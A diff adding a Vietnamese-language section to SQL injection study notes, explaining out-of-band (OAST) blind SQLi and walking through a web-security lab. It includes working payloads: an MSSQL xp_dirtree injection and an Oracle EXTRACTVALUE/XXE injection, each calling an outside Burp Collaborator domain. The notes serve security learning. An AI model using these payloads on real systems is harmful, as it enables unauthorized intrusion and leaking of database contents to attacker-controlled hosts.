@@ -1217,6 +1217,68 @@ SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
 
 **11.4. Out-of-band (OAST)**
 
+- Một số ứng dụng web thực hiện truy vấn SQL ở thread nền (asynchronous).
+
+- Khi mà những trường hợp mà phản hồi HTTP không phản ánh bất kỳ điều gì liên quan đến kết quả của truy vấn SQL, không có lỗi, không có độ trễ, không có phản hồi nội dung.
+
+- Do đó, sinh ra một phương pháp đó là out-of-band, kỹ thuật này sử dụng một "tác dụng phụ" từ truy vấn SQL để tạo ra một yêu cầu mạng (network request) đến một DNS/HTTP do ta kiểm soát. Từ đố ta có thể:
+
+  - Kiểm tra điều kiện (true/false) — nếu đúng → gửi DNS request về bạn.
+ 
+  - Xác định xem truy vấn có thực sự được thực hiện không.
+
+  - Rò rỉ dữ liệu CSDL thông qua tên miền hoặc URL được truy cập từ máy chủ.
+
+- Ví dụ trong DBMS SQL Server, nếu ta chèn một payload:
+
+  ```sqql
+  '; exec master..xp_dirtree '\\0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net\a'--
+  ```
+
+  Trong đó, domain được tạo bởi Burp, ta có thể sử dụng trong công cụ Burp Collaborator.
+
+  *exec master..xp_dirtree* là một stored procedure trong Microsoft SQL Server. Nếu ta đưa vào đường dẫn Burp như trên, SQL Server sẽ gửi một    DNS request để phân giải tên miền và nếu thấy yêu cầu DNS này xuất hiện trong Burp Collaborator → xác nhận SQLi thành công.
+
+### Lab: Blind SQL injection with out-of-band interaction
+
+- Giao diện trang web thực hiện khai thác OAST:
+
+  <img width="1919" height="887" alt="image" src="https://github.com/user-attachments/assets/e94889ce-0326-4f18-a9fb-2295e8b8680c" />
+
+- Sau khi test tất cả các payload SQLi thông thường, boolean-based, error-based, time-based không hiệu quả, ta tạo payload sử dụng kỹ thuật OAST:
+
+  ```sql
+  ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "020rrkh96d67mk3er0uxclezdqjh7avz.oastify.com"> %remote;]>'), '/l') FROM dual--
+  ```
+
+  Đây là payload cho Oracle, trong đó: *xmltype(...)* tạo ra một tài liệu XML, *EXTRACTVALUE* lấy giá trị từ XML tại XPath /l → Mục tiêu chính là parser XML bị ép xử lý DOCTYPE, trong đó chứa thực thể external.
+
+  Trong phần XML trong xmltype():
+
+  ```xml
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE root [
+    <!ENTITY % remote SYSTEM "020rrkh96d67mk3er0uxclezdqjh7avz.oastify.com">
+    %remote;
+  ]>
+  ```
+
+  *<!ENTITY % remote SYSTEM "020rrkh96d67mk3er0uxclezdqjh7avz.oastify.com">* định nghĩa entity %remote trỏ đến một domain Burp.
+
+  %remote; sẽ khiến trình phân tích XML parser thực hiện HTTP request đến domain Burp để lấy nội dung từ đó.
+
+  &rarr; Nếu request được gửi đi, attacker sẽ nhận được callback trong Burp Collaborator, chứng minh lỗ hổng blind SQLi có tồn tại.
+
+  Kết quả:
+
+  <img width="1870" height="744" alt="image" src="https://github.com/user-attachments/assets/46e77b82-a8ca-4522-aafd-1fe324f241ab" />
+
+  <img width="1919" height="841" alt="image" src="https://github.com/user-attachments/assets/557bcbc1-81af-451b-ba1c-e9cc338c6eba" />
+
+  &rarr; Tồn tại lỗ hổng OAST.
+
+
+  
 ---
 
 ## 12. 
